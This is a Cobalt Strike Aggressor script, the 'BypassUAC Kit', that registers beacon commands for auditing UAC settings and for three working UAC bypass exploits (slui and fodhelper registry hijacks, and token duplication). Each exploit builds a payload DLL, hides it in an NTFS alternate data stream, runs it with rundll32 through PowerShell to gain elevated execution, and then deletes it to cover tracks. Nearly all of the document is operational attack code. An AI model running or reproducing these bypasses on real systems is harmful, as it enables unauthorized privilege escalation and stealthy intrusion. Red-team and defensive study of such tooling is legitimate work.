### BypassUAC Kit ###
## This kit will use only fileless bypass methods
## Author: Dwight Hohnstein
## Note: A special thanks to everyone's research for their work in UAC bypasses.
##       Additionally, thanks to hfiref0x for creating an excellent repository of
##       UAC bypasses.

## Description: ##
# This script has a function to audit the current host for its current version.
# Given the version, it will return which UAC bypass methods will work.

## Usage: ##
# Aliases
#	> audit_uac                  - Return which bypass will work
#
# Right click beacon(s) to get a pop up menu that lets you
# 	- Do the checks for UAC Bypass functions
#	- Call any of the UAC bypass functions

##################################################

## Register Aliases: ##
beacon_command_register("audit_uac",
	"Audit the host for which BypassUAC methods will be successful",
	"Use: audit_uac\n\nDescription: Retrieve Always Notify UAC setting and host version number, then determine which fileless UAC bypass methods will work.",
	"Retrieve Always Notify UAC setting and host version number, then determine which fileless UAC bypass methods will work.");

alias audit_uac {
	local('$script $oneliner');
	# ackowledge command
	btask($1, "Tasked Beacon to audit UAC settings", "T1088");

	# Host this script within this beacon
	$oneliner = powershell_encode_oneliner(beacon_host_script($1, $script));

	# Task beacon to run exploit with oneliner that runs Beacon
	bpowershell_import!($1, getFileProper(script_resource("modules"),"FilelessUACBypass.ps1"));
	bpowerpick!($1, "Test-UAC");

}

# Credit to bytecode-77
# https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
sub slui_exploit {
	local('$script $oneliner');
	# ackowledge command
	btask($1, "Tasked Beacon to run BypassUAC via slui.exe Registry hijack.", "T1088");

	# Generate the payload
	if (-is64 $1) {
		$payload = artifact($2, "dllx64");
	} else {
		$payload = artifact($2, "dll");
	}
	
	$user = binfo($1, "user");

	# Stuff it into an alternate data stream
	bupload_raw($1, "C:\\Users\\" . $user . ":temp.dll", $payload);

	# Task beacon to run exploit with rundll32 and the path to the dll
	bpowershell_import!($1, getFileProper(script_resource("modules"),"FilelessUACBypass.ps1"));
	bpowerpick!($1, "Invoke-SluiBypass -Command 'rundll32.exe C:\\Users\\" . $user . ":temp.dll,Start'");

	#handle staging
	bstage($1, $null, $2);

	# Wait for payload to execute then remove the file
	sleep(15 * 1000);
	brm($1, "C:\\Users\\" . $user . ":temp.dll");
}

beacon_exploit_register("uac-slui", "Bypass UAC using Slui.exe Registry Hijack", &slui_exploit);

# Credit to winscripting
sub fodhelper_exploit {
	local('$script $oneliner');
	# ackowledge command
	btask($1, "Tasked Beacon to run BypassUAC via fodhelper.exe Registry hijack.", "T1088");

	# Generate the payload
	if (-is64 $1) {
		$payload = artifact($2, "dllx64");
	} else {
		$payload = artifact($2, "dll");
	}
	
	$user = binfo($1, "user");

	# Stuff it into an alternate data stream
	bupload_raw($1, "C:\\Users\\" . $user . ":temp.dll", $payload);

	# Task beacon to run exploit with rundll32 and the path to the dll
	bpowershell_import!($1, getFileProper(script_resource("modules"),"FilelessUACBypass.ps1"));
	bpowerpick!($1, "Invoke-FodhelperBypass -Command 'rundll32.exe C:\\Users\\" . $user . ":temp.dll,Start'");

	#handle staging
	bstage($1, $null, $2);

	# Remove file
	sleep(15 * 1000);
	brm($1, "C:\\Users\\" . $user . ":temp.dll");
}

beacon_exploit_register("uac-fodhelper", "Bypass UAC using Fodhelper Registry Hijack", &fodhelper_exploit);

# Credit to Matt Nelson (@enigma0x3), James Forshaw (@tiraniddo) and Ruben Boonen (@fuzzySec)
sub tokenduplication_exploit {
		local('$script $oneliner');
	# ackowledge command
	btask($1, "Tasked Beacon to run BypassUAC via Token Duplication.", "T1134");

	# Generate the payload
	if (-is64 $1) {
		$payload = artifact($2, "dllx64");
	} else {
		$payload = artifact($2, "dll");
	}
	
	$user = binfo($1, "user");

	# Stuff it into an alternate data stream
	bupload_raw($1, "C:\\Users\\" . $user . ":temp.dll", $payload);

	# Task beacon to run exploit with rundll32 and the path to the dll
	bpowershell_import!($1, getFileProper(script_resource("modules"),"FilelessUACBypass.ps1"));
	bpowerpick!($1, "Invoke-TokenDuplication -Binary 'cmd.exe' -Arguments '/C rundll32.exe C:\\Users\\" . $user . ":temp.dll,Start'");

	#handle staging
	bstage($1, $null, $2);

	# Remove file
	sleep(15 * 1000);
	brm($1, "C:\\Users\\" . $user . ":temp.dll");
}

beacon_exploit_register("uac-token-duplication", "Bypass UAC using Token Duplication", &tokenduplication_exploit);
